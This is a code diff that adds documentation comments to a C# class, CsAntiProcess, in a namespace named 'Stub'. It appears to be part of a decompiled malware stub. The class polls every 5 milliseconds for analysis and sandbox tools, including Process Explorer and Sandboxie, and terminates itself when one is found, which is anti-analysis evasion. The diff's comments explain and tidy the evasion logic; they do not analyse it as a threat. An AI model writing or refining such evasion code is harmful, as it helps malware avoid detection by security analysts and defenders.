@@ -9,26 +9,49 @@ using Microsoft.VisualBasic.CompilerServices;
 using System.Diagnostics;
 using System.Runtime.CompilerServices;
 using System.Timers;
-
+/**
+ * @file CsAntiProcess.cs
+ * @brief Implements anti-analysis measures by monitoring and terminating forbidden processes.
+ *
+ * This class periodically checks for the presence of known debugging or analysis tools and 
+ * terminates the application if any such process is detected.
+ */
 #nullable disable
 namespace Stub
 {
   public class CsAntiProcess
   {
+    // Timer used to schedule periodic checks.
+
     private static Timer Timer;
+    // Instance of OK (its functionality is used for anti-analysis, though details are external).
+
     private static OK N = new OK();
+
+    /**
+ * @brief Handler for the timer event that checks for unwanted processes.
+ *
+ * This function scans for a list of known analysis tool process names. If any are found,
+ * the application is terminated immediately.
+ *
+ * @param sender The source of the event.
+ * @param e The elapsed event arguments.
+ */
 
     [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
     public static void Handler(object sender, ElapsedEventArgs e)
     {
+      // Check for "procexp" processes.
       Process[] processesByName1 = Process.GetProcessesByName("procexp");
       int index1 = 0;
       while (index1 < processesByName1.Length)
       {
         Process process = processesByName1[index1];
+        // Terminate application if process is found.
         ProjectData.EndApp();
         checked { ++index1; }
       }
+      // Check for other known analysis tool processes...
       Process[] processesByName2 = Process.GetProcessesByName("SbieCtrl");
       int index2 = 0;
       while (index2 < processesByName2.Length)
@@ -166,7 +189,11 @@ namespace Stub
         checked { ++index18; }
       }
     }
-
+    /**
+     * @brief Initializes and starts the anti-process timer.
+     *
+     * This function sets up a timer that triggers the Handler method every 5 milliseconds.
+     */
     public static void Start()
     {
       CsAntiProcess.Timer = new Timer(5.0);
